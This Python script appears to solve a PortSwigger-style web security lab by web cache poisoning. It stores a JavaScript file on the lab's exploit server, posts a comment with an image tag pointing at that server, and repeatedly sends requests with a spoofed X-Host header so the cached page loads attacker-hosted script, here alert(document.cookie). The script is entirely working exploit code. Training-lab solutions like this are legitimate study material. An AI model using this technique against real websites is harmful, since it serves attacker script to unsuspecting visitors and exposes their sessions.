import time
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
nd_url = burp_url + '/resources/js/tracking.js'
post_comment = burp_url + '/post/comment'
get_csrf_url = burp_url + '/post?postId=2'

session = requests.Session()
response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/resources/js/tracking.js", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": "alert(document.cookie)", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

response = session.get(get_csrf_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "postId": "2", "comment": f"<img src=\"{exploit_server}/foo\" />\r\n", "name": "1111", "email": "1@1.com", "website": ''}
session.post(post_comment, data=burp_data)



print("'A user visits the home page roughly once a minute'. Wait 125sek")
burp_headers = {"X-Host": exploit_server[8:]}

session.headers.update({'User-Agent': 'Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'})

for _ in range(125):
        session.get(burp_url, headers=burp_headers)
        time.sleep(1)

print("If it didn't work try again in a few minutes. This lab is broken and sometimes doesn't pass the flag")
